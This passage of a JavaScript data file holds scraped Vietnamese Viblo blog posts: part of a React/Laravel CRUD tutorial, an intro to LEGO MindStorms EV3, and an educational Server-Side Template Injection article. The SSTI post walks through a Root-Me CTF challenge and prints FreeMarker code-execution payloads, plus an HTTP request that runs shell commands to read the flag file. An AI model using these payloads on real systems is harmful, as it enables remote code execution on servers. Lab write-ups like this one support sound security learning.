e.preventDefault();\n        const {form, history} = this.props;\n\n        form.validateFields((err, values) => {\n            if (!err) {\n                axios.post('/api/posts', values)\n                    .then(response => {\n                        history.push('/')\n                    })\n                    .catch(error => {\n                       console.log(error);\n                    })\n            }\n        });\n    };\n\n    render() {\n        const {form} = this.props;\n        const {getFieldDecorator} = form;\n\n        return (\n            <Form labelCol={{ span: 5 }} wrapperCol={{ span: 12 }} onSubmit={this.handleSubmit}>\n                <Form.Item label=\"Tên bài viết\">\n                    {getFieldDecorator('title', {\n                        rules: [{ required: true, message: 'Vui lòng nhập tên bài viết!' }],\n                    })(<Input />)}\n                </Form.Item>\n                <Form.Item label=\"Nội dung\">\n                    {getFieldDecorator('content', {\n                        rules: [{ required: true, message: 'Vui lòng nhập nội dung bài viết!' }],\n                    })(<TextArea rows={6} />)}\n                </Form.Item>\n                <Form.Item wrapperCol={{ span: 12, offset: 5 }}>\n                    <Button type=\"primary\" htmlType=\"submit\">\n                        Thêm\n                    </Button>\n                </Form.Item>\n            </Form>\n        );\n    }\n}\nconst WrappedAdd = Form.create({ name: 'addForm' })(Add);\n\nexport default WrappedAdd;\n```\n\nVề việc tạo ra những thành phần trong form thì bạn có thể đọc ở đây để rõ thêm nhé: https://ant.design/components/form/. Ở trong function `handleSubmit`, mình cần kiểm tra xem có bất kì lỗi gì không, nếu không có thì sẽ gửi 1 request api để thêm dữ liệu. Nếu các bạn từng làm quen với các frontend framework như angular hay vue thì chắc cũng không xa lạ gì với `axios`. Còn nếu không thì bạn có thể đọc qua ở đây: [Giới thiệu về axios](https://viblo.asia/p/gioi-thieu-ve-axios-mot-http-client-dua-tren-promise-cua-javascript-maGK7MeOlj2). Ở đây nếu thêm thành công thì mình sẽ quay trở lại trang chủ, còn phát hiện lỗi thì sẽ log lỗi đó ra console.\n\nVà giờ hãy quay lại `App.js` để bổ sung thêm route này nhé\n```javascript\nimport Add from './Add';\n\n\n<Header />\n<Switch>\n    <Route path='/create' component={Add} />\n</Switch>\n```\n\nBạn hãy thử ấn nút thêm bài viết và tạo thử 1 bài viết xem đã chạy tốt chưa nhé :D\n\n## List component\nThêm được rồi thì phải có danh sách hiển thị chứ đúng không? Mình sẽ tạo `List.js` và chức năng xóa bài viết nhé\n```javascript\nimport React from 'react';\nimport {Link} from 'react-router-dom'\nimport {Button, List} from 'antd';\nimport axios from 'axios'\n\nclass ListPosts extends React.Component {\n    constructor(props) {\n        super(props);\n\n        this.state = {\n            data: []\n        }\n    }\n\n    componentDidMount() {\n        axios.get('/api/posts').then(response => {\n            this.setState({\n                data: response.data\n            })\n        })\n    }\n\n    deletePost = (id) => {\n        axios.post(`/api/posts/delete/${id}`)\n            .then(response => {\n                alert('Xoa thanh cong');\n                this.setState({\n                    data: response.data\n                });\n            })\n            .catch(error => {\n                console.log(error);\n            })\n    };\n\n    render() {\n        const {data} = this.state;\n\n        return (\n            <List\n                itemLayout=\"horizontal\"\n                dataSource={data}\n                renderItem={item => (\n                    <List.Item>\n                        <List.Item.Meta\n                            title={item.title}\n                            description={item.content}\n                        />\n                        <Link to={`edit/${item.id}`}>\n                            <Button type=\"primary\">\n                                Chỉnh sửa\n                            </Button>\n                        </Link>\n                        <Button type=\"danger\" onClick={() => this.deletePost(item.id)}>\n                            Xóa\n                        </Button>\n                    </List.Item>\n                )}\n            />\n        );\n    }\n}\n\nexport default ListPosts;\n```\n\nTrong `componentDidMount` mình sẽ gọi api để lấu dữ liệu và lưu data lấy về vào trong state. Còn ở function `deletePost` thì mình sẽ gọi tới api xóa, xóa thành công thì sẽ có alert, fail sẽ log ra. Và đừng quên thêm route trong `App.js` nhé và hãy chạy thử các chức năng đã hoàn thiện xem sao\n```javascript\nimport LitsPosts from './List';\n\n<Switch>\n    <Route exact path='/' component={ListPosts} />\n    <Route path='/create' component={Add} />\n</Switch>\n```\n\n## Edit component\nCố lên nào, tới component cuối cùng rồi. Thật ra thì bạn có thể sử dụng lại `Add.js` và thêm một thuộc tính `isUpdate` vào trong `props`  để phân biệt giữa add và edit. Nhưng mình cứ tách ra nhé. Tạo file `Edit.js`\n```javascript\nimport React from 'react';\nimport axios from 'axios'\nimport {Form, Input, Button} from 'antd';\n\nconst {TextArea} = Input;\n\nclass Edit extends React.Component {\n    constructor(props) {\n        super(props);\n\n        this.state = {\n            data: {}\n        }\n    }\n\n    componentDidMount() {\n        const {match} = this.props;\n\n        axios.get(`/api/posts/${match.params.id}`).then(response => {\n            this.setState({\n                data: response.data\n            })\n        })\n    }\n\n    handleSubmit = e => {\n        e.preventDefault();\n        const {form, history, match} = this.props;\n\n        form.validateFields((err, values) => {\n            if (!err) {\n                axios.post(`/api/posts/${match.params.id}`, values)\n                    .then(response => {\n                        alert('thanh cong');\n                    })\n                    .catch(error => {\n                        console.log(error);\n                    })\n            }\n        });\n    };\n\n    render() {\n        const {form} = this.props;\n        const {getFieldDecorator} = form;\n        const {data} = this.state;\n\n        return (\n            <Form labelCol={{span: 5}} wrapperCol={{span: 12}} onSubmit={this.handleSubmit}>\n                <Form.Item label=\"Tên bài viết\">\n                    {getFieldDecorator('title', {\n                        rules: [{required: true, message: 'Vui lòng nhập tên bài viết!'}],\n                        initialValue: data.title\n                    })(<Input/>)}\n                </Form.Item>\n                <Form.Item label=\"Nội dung\">\n                    {getFieldDecorator('content', {\n                        initialValue: data.content,\n                        rules: [{required: true, message: 'Vui lòng nhập nội dung bài viết!'}],\n                    })(<TextArea rows={6}/>)}\n                </Form.Item>\n                <Form.Item wrapperCol={{span: 12, offset: 5}}>\n                    <Button type=\"primary\" htmlType=\"submit\">\n                        Sửa\n                    </Button>\n                </Form.Item>\n            </Form>\n        );\n    }\n}\n\nconst WrappedEdit = Form.create({name: 'editForm'})(Edit);\n\nexport default WrappedEdit;\n```\n\nỞ đây ở trong phần render sẽ khác so với `Add` một chút là sẽ có thêm `initialValue`, thuộc tính này sẽ nhận vào giá trị mặc định ban đầu. Trong `componentDitMount` mình sẽ gọi api lấy dữ liệu, và mình dùng thuộc tính `match` trong `props` để xác định xem id của bài viết. Phần `handleSubmit` thì cũng gần tương tự như `Add`  thôi.\n\n# Kết luận\nVậy là demo đã hoàn thành rồi, mong rằng sẽ giúp ích cho các bạn được phần nào :D Vì mình cũng không có quá nhiều thời gian làm demo này nên chưa chăm chút cho nó được lắm. Các bạn nên làm chi tiết hơn để tìm hiểu được nhiều thứ hơn nhé\n\nTham khảo: https://blog.pusher.com/react-laravel-application/",
        "published_at": "2020-02-11 09:19:22",
        "is_published": true,
        "updated_at": "2020-02-12 21:42:00",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 8,
        "points": 5,
        "views_count": 105,
        "clips_count": 2,
        "comments_count": 0,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/7f826db5-bc14-4ab9-864e-a0dd888ecdac.png",
        "user": {
            "data": {
                "id": 34730,
                "url": "https://viblo.asia/u/duong.manh.hoang",
                "avatar": "e9107983-8b6f-4411-99d6-8d996a20eb6a.png",
                "name": "Dương Mạnh Hoàng",
                "username": "duong.manh.hoang",
                "followers_count": 7,
                "reputation": 341,
                "posts_count": 12,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "reactjs",
                    "name": "ReactJS",
                    "primary": false,
                    "image": "https://placehold.jp/16/c0392b/ffffff/80x80.jpg?text=ReactJS&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "laravel",
                    "name": "Laravel",
                    "primary": false,
                    "image": "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=Laravel&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": []
        }
    },
    {
        "id": 38382,
        "title": "Khám phá thế giới MindStorm EUV3",
        "slug": "Ljy5V7NMKra",
        "url": "https://viblo.asia/p/kham-pha-the-gioi-mindstorm-euv3-Ljy5V7NMKra",
        "user_id": 20441,
        "moderation": null,
        "transliterated": "kham-pha-the-gioi-mindstorm-euv3",
        "contents_short": "1. MindStorm là gì?\n\nChắc hẳn trong chúng ta ai cũng đã từng trải qua tuổi thơ với những khối đồ chơi LEGO, nơi mà chúng ta thoả sức sáng tạo ra các mô hình thú vị, hay đơn giản là lắp ráp những đồ...",
        "contents": "# 1. MindStorm là gì?\n![](https://images.viblo.asia/0dc4ccb5-be25-4619-b0d0-e8c55f74ac18.gif)\n![](https://images.viblo.asia/970c5311-6c11-4462-8b4f-1a0574cf9b24.gif)\n![](https://images.viblo.asia/1fb4212c-d5aa-43e0-b8f2-42f1d16f4eba.gif)\n\n\nChắc hẳn trong chúng ta ai cũng đã từng trải qua tuổi thơ với những khối đồ chơi LEGO, nơi mà chúng ta thoả sức sáng tạo ra các mô hình thú vị, hay đơn giản là lắp ráp những đồ vật chúng ta thích, hơn thế nữa, chắc hẳn chúng ta đã từng muốn chúng có thể chuyển động được.\n\nVà để làm được điều đó, LEGO đã tạo ra **LEGO MindStorms EUV3**, một phiên bản phát triển từ bộ LEGO NXT. Để giúp chúng ta có thể lập trình và phát triển những cỗ máy, những con robot được lắp ráp từ lego một cách dễ dàng hơn, linh hoạt hơn so với những phiên bản trước đó.\n\n![](https://images.viblo.asia/81e970d5-8689-4e19-b672-719f4aac28aa.png)\n\n\n# 2. Tại sao lại sử dụng Lego MindStorm EUV3?\n\nSức mạnh của hệ thống Lego nằm ở chỗ nó có thể sử dụng lại. Cùng một khối nhưng hôm nay nó có thể là 1 cánh tay của robot, ngày mai chúng ta có thể sử dụng nó làm chân của một con vật, và ngày sau nữa nó có thể là 1 khối của thấp Eiffel\n\n# 3. Bộ Lego MindStorm cơ bản\n\nVới Lego MindStorm EUV3 gồm có: \n- 3 động cơ Servo\n- 5 cảm biến ( Gyro, Ultrasonic, Color, 2 Touch )\n- và các linh kiện pin, dây sạc, ...\n\n![](https://images.viblo.asia/c73444ea-5bef-4ddf-a7b5-75090668c4ca.png)\n\n### 3.1 EV3 Brick\n\n![](https://images.viblo.asia/90264715-7340-409f-afb6-6e097992cae3.png)\n\n**1.** Gồm các chức năng: back, dừng chương trình hoặc tắt bộ não\n\n**2.** Gồm các chức năng: lựa chọn mục cần chọn, chạy chương trình, mở bộ não\n\n**3.** Tương tự các phím điều khiển\n\nCác bạn có thấy 4 tab nằm ngang được hiển thị trên màn hình, mình sẽ đi từ trái qua: \n- tab 1: Hiển thị các chương trình đã chạy gần đây\n- tab 2: Các file được lưu theo project\n- tab 3: Port View\n- tab 4: Setting\n\n![](https://images.viblo.asia/32bea91b-706d-4ce5-86b5-078dbc735737.png)\n\nTương tự Brick có 3 trạng thái để báo cho ta biết những trường hợp như code lỗi hay chạy thành công.\n\n- Red = Startup, Updating, Shutdown\n-  Red pulsing = Busy\n- Orange = Alert, Ready\n- Orange pulsing = Alert, Running\n- Green = Ready\n- Green pulsing = Running Program\n\n\n### 3.2 Ports, Sencors, và các Motors\n\n**Ports**\n\nMột bộ não có 8 port tương đương với 1, 2, 3, 4 và A, ,B, C, D\n\nCác bạn nên nhớ đó là với các port là chữ số thì sẽ kết nối giữa bộ nào và các sencors, còn các port là chữ thì sẽ kết nối giữa bộ não và các động cơ.\n\nNgoài ra bộ não còn được trang bị cả khe cắm usb, sd card để chạy các chương trình có sẵn, ...\n\n![](https://images.viblo.asia/8074248c-abd7-4e74-8da1-a2c278a1cd64.png)\n\n\n**Motors**\n\n- Large Motor: có khả năng quay 160 - 170 vòng/phút , sử dụng bộ đếm số vòng quay (tacho feedback) cực kì chính xác cho phép bạn điều khiển động cơ với sai số < 1 độ.\n- Medium Motor: động cơ servo loại trung bình có khả năng quay 240 - 250 vòng/phút nhanh hơn rất nhiều với động cơ lớn, vì vậy thường được gắn làm tay để có sức nâng lớn hơn.\n\n\n**Sencors**\n\n- Ultrasonic sencor: bằng cách tạo ra sóng âm, sóng âm được phát ra gặp vật thể sẽ phản xạ lại, cảm biến đo khoảng cách EUV3 sẽ tiếp nhận các sóng âm phản xạ và đo lường khoảng cách từ Robot cho tới vật cản phía trước. Ultrasonic sencor có thể đo với khoảng cách từ 1cm - 250cm với sai số dưới 1cm.\n- Color sencor: bằng cách nhận biết 8 màu khác nhau cũng như để thử nghiệm phản xạ ánh sáng của các màu sắc. Nó tương tự như switch case trong lập trình ấy các ông à :v: \n- Touch sencor: là một cảm biến đơn giản nhưng cực kỳ chuẩn xác trong việc phát hiện lúc nào chiếc nút màu đỏ trên cảm biến được ấn và thả ra. Với Touch sencor bạn có thể cho Robot thực hiện các lệnh bất kỳ mỗi khi chiếc nút được ấn, xây dựng Robot tìm đường khi chạm có thể rẽ trái hoặc phải, hoặc làm đàn guitar, piano :v, ..., đó là tuỳ các bạn sử dụng nó như nào\n- Gyro Sencor: thiết kế giúp đo lương chuyển động quay của robot và thay đổi phương hướng của nó. Có thể đo góc độ tạo nên sự cân bằng cho robot.\n\nTrên đây là mình giới thiệu qua cơ bản về MindStorm và các bộ phận của nó, phần sau mình sẽ đi qua về phần lập trình ra sao, thank for watching :hugs:.",
        "published_at": "2020-02-10 19:00:58",
        "is_published": true,
        "updated_at": "2020-02-12 20:00:07",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 5,
        "points": 3,
        "views_count": 55,
        "clips_count": 1,
        "comments_count": 7,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/0dc4ccb5-be25-4619-b0d0-e8c55f74ac18.gif",
        "user": {
            "data": {
                "id": 20441,
                "url": "https://viblo.asia/u/longnk1301",
                "avatar": "b1085220-d401-45b2-b4e9-5e2d30c3001d.jpg",
                "name": "Nguyễn Khánh Long",
                "username": "longnk1301",
                "followers_count": 26,
                "reputation": 899,
                "posts_count": 27,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "reseach",
                    "name": "reseach",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=reseach&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "mindstorm",
                    "name": "mindStorm",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=mindStorm&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 16749,
                    "url": "https://viblo.asia/u/vuongthai95",
                    "avatar": "a461f09c-31af-4628-94ec-0ea890b4dd79.jpg",
                    "name": "Vương Minh Thái ",
                    "username": "vuongthai95",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 20441,
                    "url": "https://viblo.asia/u/longnk1301",
                    "avatar": "b1085220-d401-45b2-b4e9-5e2d30c3001d.jpg",
                    "name": "Nguyễn Khánh Long",
                    "username": "longnk1301",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        }
    },
    {
        "id": 38376,
        "title": "Server-Side Template Injection",
        "slug": "YWOZrxvy5Q0",
        "url": "https://viblo.asia/p/server-side-template-injection-YWOZrxvy5Q0",
        "user_id": 37471,
        "moderation": null,
        "transliterated": "server-side-template-injection",
        "contents_short": "1. Server-side template injection là gì ?\n- Template engines (công cụ giúp chúng ta tách mã HTML thành các phần nhỏ hơn mà chúng ta có thể sử dụng lại trên nhiều tập tin HTML) được sử dụng rộng rãi...",
        "contents": "## 1. Server-side template injection là gì ?\n- Template engines (công cụ giúp chúng ta tách mã HTML thành các phần nhỏ hơn mà chúng ta có thể sử dụng lại trên nhiều tập tin HTML) được sử dụng rộng rãi bởi các ứng dụng web nhằm trình bày dữ liệu thông qua các trang web và emails. Việc nhúng các đầu vào từ phía người dùng theo cách không an toàn vào trong templates dẫn đến Server-Side Template Injection - một lỗ hổng nghiêm trọng thường xuyên dễ dàng bị nhầm lẫn với Cross-Site Scripting (XSS), hoặc hoàn toàn bị ngó lơ. \n![](https://images.viblo.asia/fb9ee2bd-415d-4b83-8fc0-afbfa8d9ceb7.png)\n\n- Không giống như XSS, Template Injection có thể được sử dụng để tấn công trực tiếp vào bên trong máy chủ web và thường bao gồm Remote Code Execution (RCE) - thực thi mã từ xa, biến mọi ứng dụng dễ bị tấn công thành các điểm then chốt tiềm năng (a potential pivot point). Template Injection có thể phát sinh không những thông qua những lỗi thuộc về phía nhà phát triển mà còn thông qua những hành vi có chủ đích của template để cố gắng cung cấp những chức năng phong phú - thường được thực hiện bởi wikis, blogs, các ứng dụng tiếp thị và các hệ thống quản lý nội dung.\n\n## 2. Server-side template injection xảy ra khi nào ?\n- Server-side template injection xảy ra khi những nội dung được nhập vào từ phía người dùng được nhúng không an toàn vào template ở phía máy chủ, cho phép người sử dụng có thể inject template trực tiếp. Bằng cách sử dụng các template độc hại , kẻ tấn công có thể thực thi mã tùy ý và kiểm soát hoàn toàn web server. Mức độ nghiêm trọng của vấn đề này khác nhau tùy thuộc vào loại template engines được sử dụng. Các template engine có thể nằm trong phạm vi từ dễ dàng đến gần như không thể khai thác. \n- Xem xét ví dụ sau: \n    + Một ứng dụng marketing gửi hàng loạt các emails, và sử dụng Twig template để gửi lời chào đến khách hàng. Nếu chỉ có tên người dùng được truyền vào template như ví dụ sau, mọi thứ sẽ hoạt động tốt : <br>\n`$output = $twig->render(\"Dear {first_name},\", array(\"first_name\" => $user.first_name) );`\n    + Tuy nhiên, nếu người dùng được phép tùy chỉnh các email này, vấn đề sẽ phát sinh: <br>\n    `$output = $twig->render($_GET['custom_email'], array(\"first_name\" => $user.first_name) );`\n\t+ Trong trường hợp này, người dùng kiểm soát nội dung của template thông qua tham số **GET customemail**, thay vì giá trị được truyền vào nó. Điều này dẫn đến một lỗ hổng XSS. Tuy nhiên XSS chỉ là một biểu hiện của một lỗi tinh vi và nghiêm trọng hơn. Đoạn code này đã chỉ ra một loại attack surface có phạm vi rộng nhưng lại dễ bị bỏ qua.\n    + Output từ 2 message sau đây đưa ra dấu hiệu về lỗ hổng phía máy chủ:\n```\ncustomemail={{7*7}}\n49\n```\n```\ncustomemail={{self}}\nObject of class TwigTemplate7ae62e582f8a35e5ea6cc639800ecf15b96c0d6f78db3538221c1145580ca4a5 could not be converted to string*\n```\n \n \n+ Lỗ hổng này thường được phát sinh thông qua việc các nhà phát triển cố ý cho phép nguời dùng submit hoặc edit các template.  Hơn nữa, Template injection không chủ ý  cực kỳ dễ bỏ lỡ vì thường sẽ không có bất kỳ dấu hiệu nào có thể nhìn thấy. \n* Các lỗ hổng template injection có thể rất nghiêm trọng và gây hại tới toàn bộ chức năng hoặc dữ liệu của ứng dụng. Cũng có khả năng nó sử dụng server như một platform cho các cuộc tấn công tiếp theo với các hệ thống khác. Bên cạnh đó, một số lỗ hổng template injection có thể không gây ra các rủi ro bảo mật đáng kể.\n\n## 3. Quy trình của một cuộc tấn công\n![](https://images.viblo.asia/43842564-1a0b-420b-9e51-70263e70ae68.png)\n### Detect\n>  Lỗ hổng này có thể xuất hiện trong hai bối cảnh riêng biệt, mỗi bối cảnh đòi hỏi phương pháp phát hiện riêng.\n1. Plaintext context\n\n* Lỗi thường sẽ xuất hiện theo một trong những phương thức sau:\n```\nsmarty=Hello {user.name}\nHello user1\n``` \n```\nfreemarker=Hello ${username}\nHello newuser\n```\n```html\nany=<b>Hello</b>\n<b>Hello<b>\n```\n \n* Để phát hiện lỗi, chúng ta cần gọi template engine bằng cách nhúng một câu lệnh. Có một số lượng lớn các template languages nhưng phần lớn trong đó chia sẻ các đặc điểm cú pháp cơ bản. Chúng ta có thể tận dụng điều này bằng cách gửi các payload sử dụng các toán tử cơ bản để phát hiện nhiều template engine bằng 1 câu HTTP request duy nhất.\n```\nsmarty=Hello ${7*7}\nHello 49\n``` \n```\nfreemarker=Hello ${7*7}\nHello 49\n```\n2. Code context\n\n* Dữ liệu đầu vào của người dùng cũng có thể được đặt trong một template statement, thường là tên biến\n```\npersonal_greeting=username\nHello user01\n```\n \n* Biến này thậm chí còn dễ bỏ sót hơn trong quá trình đánh giá, vì nó không dẫn đến XSS một cách rõ ràng. Thay đổi giá trị của username thường sẽ trả về kết quả rỗng hoặc gây lỗi ứng dụng. Trường hợp này có thể được phát hiện bằng cách xác minh các tham số không thể XSS trực tiếp, sau đó thoát ra khỏi template statement và thêm thẻ HTML vào sau nó :\n```\npersonal_greeting=username<tag>\nHello\n```\n```\npersonal_greeting=username}}<tag>\nHello user01 <tag>\n```\n \n### Identify\n - Sau khi phát hiện được template injection , bước tiếp theo là xác định template engine đang được sử dụng. Mũi tên xanh và đỏ tương ứng lần lượt với response 'success' và 'failure'. Trong một số trường hợp, một payload có thể có nhiều response thành công khác nhau \n- ví dụ: test với input {{7 * '7'}} sẽ dẫn đến \n    + 49 trong Twig \n    + 7777777 trong Jinja2 \n    + Không trả về gì nếu không có template engine nào đước sử dụng.\n    ![](https://images.viblo.asia/1b20d79b-7ca2-4056-943b-97f706baf51d.png)\n\n### Exploit\n1. Read\n\nSau khi xác định được template engine, việc tiếp theo đọc tài liệu liên quan. Các nội dung cần quan tâm chính là:\n+ Cú pháp cơ bản của template engine\n+ Danh sách các phương thức, hàm, bộ lọc và biến đã được dựng sẵn\n+ Danh sách các tiện ích mở rộng / plugin \n2. Explore\n\nỞ bước này, việc chúng ta cần làm là tìm ra chính xác những gì có thể truy cập được.\n+ Xem xét cả những objects mặc định được cung cấp bởi template engine lẫn các objects dành riêng cho ứng dụng được truyền vào template bởi các nhà phát triển. \n+ Bruteforce các tên biến. Các object do nhà phát triển cung cấp có khả năng chứa các thông tin nhạy cảm.\n\n3. Attack\n\nXem xét từng function để tìm các lỗ hổng có thể khai thác. Các dạng tấn công có thể là tạo object tùy ý, đọc / ghi file tùy ý (bao gồm cả remote file), hay khai thác lỗ hổng leo thang đặc quyền.\n\n## 4. Ví dụ về Server-Side Template Injection\n\n* Một challenge của root me : \nhttp://challenge01.root-me.org/web-serveur/ch41/\n*  Đọc source code và thấy function sau:\n```\nfunction checkNickname() {\n\t    var serviceUrl = \"check\";\n\t    var nick = $(\"#nickname\").val();\n\t    var postData = \"nickname=\" + encodeURIComponent(nick);\n\t    $.ajax({\n\t        url: serviceUrl,\n\t        type: \"POST\",\n\t        data: postData,\n\t        contentType: \"application/x-www-form-urlencoded\",\n\t        dataType: \"text\",\n\t        success: function(data) {\n\t            $(\"#result\").text(data);\n\t        },\n\t        error: function(data) {\n\t            $(\"#result\").text(\"An error occurs!\");\n\t        }\n\t    });\n\t}\n```\n* Hàm này sử dụng ajax trong jquery để gửi data từ client lên server:\n    + url: serviceUrl (gửi data đến url: /web-serveur/ch41/check)\n    + type : \"POST\" (dùng POST method)\n    + data : postData (data được gửi đi nằm trong biến postData)\n \n* Nếu request thành công thì nó sẽ trả lại dữ liệu trong \"data\" và đổ vào thẻ div có id là \"result\", ngược lại thì đưa ra thông báo lỗi \"An error occurs!\".\n \n* Đầu tiên, cần phải xác định loại template engine được sử dụng: \n![](https://images.viblo.asia/022930cb-0447-4d30-b728-84edcd4ebbb4.png)\n\n![](https://images.viblo.asia/ee733249-3b20-43ab-9320-472469e6deeb.png)\n\n=> Báo error như ảnh thì đoán engine được dùng có thể là FreeMarker\n- Xem các payload trong link sau để hiểu rõ hơn :\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\n- Trong link trên đã có ngay gợi ý đoạn code excution (https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#code-execution-2)\n\n```\n<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")}\n[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}\n${\"freemarker.template.utility.Execute\"?new()(\"id\")}\n```\n-  <#assign> cho phép định nghĩa biến ngay trong template (http://freemarker.org/docs/dgui_misc_var.html).  Đoạn code trên tạo một tên biến là \"ex\", việc sử dụng Built-in `\"freemarker.template.utility.Execute\"?new()` cho phép tạo một object tùy ý, chính là object của \"Excute\" Class được implement từ \"TemplateModel\". \n-  Sử dụng payload trên để sửa nội dung input trong \"nickname\" khi bắt gói tin bằng Burp Suite:\n\n \n```http\nPOST /web-serveur/ch41/check HTTP/1.1\nHost: challenge01.root-me.org\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nReferer: http://challenge01.root-me.org/web-serveur /ch41/\nContent-Length: 0\nDNT: 1\nConnection: close\nnickname=<#assign command=\"freemarker.template.utility. Execute\"?new() > ${command(\"ls\") }\n```\n \n* Trang web response lại:\n\n```http\nHTTP/1.1 200 OK Server: nginx \nDate: Thu, 06 Feb 2020 02:27:09 GMT\nConnection: close \nContent-Length: 73\nIt's seems that I know you :) \tSECRET_FLAG.txt\npom.xml \nsrc \ntarget \nwebapp\n```\n \n \nthay \"ls\" thành \"cat SECRET_FLAG.txt\", lấy được Flag: \n![](https://images.viblo.asia/2fae635f-c366-4744-9e3c-92a5d24513fa.png)\n\n## 5. Kết luận\nCác lỗ hổng liên quan đến Server-side template injection thường bị bỏ qua. Để hạn chế, ngăn chặn những rủi ro không đáng có, các lập trình viên nên cẩn thận trong việc cho phép dữ liệu đầu vào của người dùng được chèn vào template cũng như kiểm tra kỹ template được sử dụng trong Website của mình.\n\n\n## References\n- https://portswigger.net/kb/issues/00101080_server-side-template-injection\n- https://portswigger.net/research/server-side-template-injection\n- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\n- http://dienpv-0pain.blogspot.com/2017/06/server-side-template-injection.html",
        "published_at": "2020-02-10 15:47:27",
        "is_published": true,
        "updated_at": "2020-02-12 20:10:01",
        "translation_source": null,
        "trend_at": null,
        "promoted_at": null,
        "reading_time": 6,
        "points": 6,
        "views_count": 155,
        "clips_count": 4,
        "comments_count": 2,
        "rated_value": null,
        "promoted": false,
        "trending": false,
        "is_draft": false,
        "is_public": true,
        "locale_code": "vi",
        "is_video": false,
        "thumbnail_url": "https://images.viblo.asia/fb9ee2bd-415d-4b83-8fc0-afbfa8d9ceb7.png",
        "user": {
            "data": {
                "id": 37471,
                "url": "https://viblo.asia/u/nhatha_matcha",
                "avatar": "a5dcb7c0-6a93-4dea-8553-e64d3ce73b89.jpg",
                "name": "Nhật Hà",
                "username": "nhatha_matcha",
                "followers_count": 7,
                "reputation": 138,
                "posts_count": 2,
                "banned_at": null,
                "following": false
            }
        },
        "tags": {
            "data": [
                {
                    "slug": "jinja2-template",
                    "name": "Jinja2 template",
                    "primary": false,
                    "image": "https://placehold.jp/16/8e44ad/ffffff/80x80.jpg?text=Jinja2+template&css=%7B%22padding%22%3A%223px%22%7D"
                },
                {
                    "slug": "cybersecurity",
                    "name": "CyberSecurity",
                    "primary": false,
                    "image": "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=CyberSecurity&css=%7B%22padding%22%3A%223px%22%7D"
                }
            ]
        },
        "commentators": {
            "data": [
                {
                    "id": 36439,
                    "url": "https://viblo.asia/u/testanull",
                    "avatar": "698a296f-a5ec-4154-a637-add5a08b0a2c.jpg",
                    "name": "Nguyen Jang",
                    "username": "testanull",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                },
                {
                    "id": 40196,
                    "url": "https://viblo.asia/u/nguyendangthanh16021",
                    "avatar": "d4971ff8-a0e7-4d6c-844d-cf743f218947.jpg",
                    "name": "Shere Khan",
                    "username": "nguyendangthanh16021",
                    "followers_count": 0,
                    "reputation": 0,
                    "posts_count": 0,
                    "banned_at": null
                }
            ]
        },
        "organization": {
            "data": {
                "id": 88,
                "name": "Sun* Cyber Security Team",
                "user_id": 16,
                "avatar": "6fba9e20-cbb1-4b63-aa36-c0e5664d19d1.png",
                "slug": "sun-cyber-security-team",
                "following": false,
                "followers_count": 53,
                "location": " R&D Unit @ Sun* Asterisk .Inc",
                "posts_count": 45,
                "website": null,
                "members_count": 10,
                "google_analytics_id": null,
                "short_description": "Let's hack all the things!",
                "full_description": "###  Who we are?\n\nWe're __Sun*$hell__, Cyber Security Team of R&D Unit @ Sun* Asterisk .Inc\n\n### What do we do?\n- Pentesting web apps\n- Find 🐞 and report vulnerabilities\n- Improve the security of Sun Asterisk’s web/app \n- Research new vulnerabilities\n- Play CTF 🇻🇳\n\n### [CTFtime](https://ctftime.org/team/81906)\n\n### [Join us!](https://research.sun-asterisk.com/en/join-us)",
                "approved": true
            }
        }
    }
]

export default {
    posts
}